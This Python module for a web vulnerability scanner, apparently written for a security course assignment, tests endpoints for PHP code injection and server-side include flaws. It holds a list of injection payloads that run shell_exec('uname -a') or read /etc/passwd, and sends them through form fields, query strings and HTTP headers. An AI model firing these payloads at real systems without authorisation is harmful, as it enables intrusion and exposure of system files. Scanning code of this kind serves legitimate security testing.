from AttackModule import AttackModule
from AttackReport import AttackReport
from Helpers import Helper

class PhpCodeInjAttackModule(AttackModule):
	attackPatterns = [
		""
		"<!--#exec cmd=\"uname -a\" -->",	
		"<!--#exec cmd=\"cat /etc/passwd\" -->",	
		"<!--#include file=\"/etc/passwd\"-->",

		"shell_exec(\"uname -a\")",
		"shell_exec(\"uname -a\") #",
		"; shell_exec(\"uname -a\")",
		"; shell_exec(\"uname -a\");",
		"; shell_exec(\"uname -a\"); ",

		"\'shell_exec(\"uname -a\")\'",
		"\'shell_exec(\"uname -a\") #\'",
		"\'; shell_exec(\"uname -a\")\'",
		"\'; shell_exec(\"uname -a\");\'",
		"\'; shell_exec(\"uname -a\"); \'",

		"\"shell_exec(\"uname -a\")\"",
		"\"shell_exec(\"uname -a\") #\"",
		"\"; shell_exec(\"uname -a\")\"",
		"\"; shell_exec(\"uname -a\");\"",
		"\"; shell_exec(\"uname -a\"); \"",
	]
	attackHeaders = [
		"",
		"Referer",
		"User-Agent"
	]
	unameStrings = [
		"Linux student-CS5331-A2 3.13.0-32-generic",
		"Linux xefro-ux 4.13.0-38-generic",
		"Linux ubuntu-xenial 4.4.0-116-generic",
		"root:x:0:0:root:/root:/bin/bash"
	]
	
	def __init__(self):
		AttackModule.__init__(self, "PHP Code Injection", "Server Side Code Injection")
		

	def attack(self, endpoint):
		print "    Beginning attack -> PHP Code Injection"
		self.attack_succeeded = False
		self.attack_report = None
		
		totalAttacks = len(PhpCodeInjAttackModule.attackPatterns) * len(PhpCodeInjAttackModule.attackHeaders)
		attackCounter = 1
		for attackHeader in PhpCodeInjAttackModule.attackHeaders:
			for attackPattern in PhpCodeInjAttackModule.attackPatterns:
				header = {}
				if len(attackHeader) > 0:
					header = { attackHeader: attackPattern }
				result = self.launch_attack(endpoint, attackPattern, header)
				if result:
					self.attack_succeeded = True
					print "    [ PhpCodeInj: {0} / {1}, {2}, {3} ] ->".format(attackCounter, 
								totalAttacks, attackPattern, header),
					print result
					break
				else:
					attackCounter += 1
			if self.attack_succeeded:
				break

		if self.attack_succeeded:
			print "    Finished attack -> VULNERABLE!\n"
		else:
			print "    Finished attack -> Nothing found!\n"
			
	
	def launch_attack(self, endpoint, payload, payloadHeaders):
		headers = {}
		for key in payloadHeaders.keys():
			headers[key] = payloadHeaders[key]

		formData = self.get_form_data(endpoint)
		
		if len(formData) == 0:
			res = None
			if endpoint.method.upper() == "GET":
				res = Helper.do_get_request(endpoint, headers, formData)
			elif endpoint.method.upper() == "POST":
				res = Helper.do_post_request(endpoint, headers, formData)

			if self.is_attack_successful(res):
				report = AttackReport(self.attackClass, endpoint, headers, formData, "")
				AttackReport.add_attack_report(report)
				return True
		else:
			for key in formData.keys():
				formData = self.get_form_data(endpoint)
				formData[key] = payload
				res = None
				if endpoint.method.upper() == "GET":
					res = Helper.do_get_request(endpoint, headers, formData)
				elif endpoint.method.upper() == "POST":
					res = Helper.do_post_request(endpoint, headers, formData)

				if self.is_attack_successful(res):
					report = AttackReport(self.attackClass, endpoint, headers, formData, "")
					AttackReport.add_attack_report(report)
					return True

		return False

	def get_form_data(self, endpoint):
		formData = {}
		if endpoint.is_form():
			formData = endpoint.get_form().get_form_data_dict()
		elif endpoint.has_query_string():
			formData = endpoint.get_query_string_dict()
		return formData

	def is_attack_successful(self, res):
		if res.ok:
			if res.status_code == 200:
				if any(match in res.text for match in PhpCodeInjAttackModule.unameStrings):
					return True
			else:
				print "WARNING: PhpCodeInjAttackModule, " + \
					"is_attack_successful, unrecognized status code: {0} for {1}".format(
						res.status_code, res.request.url)
		return False
			
		
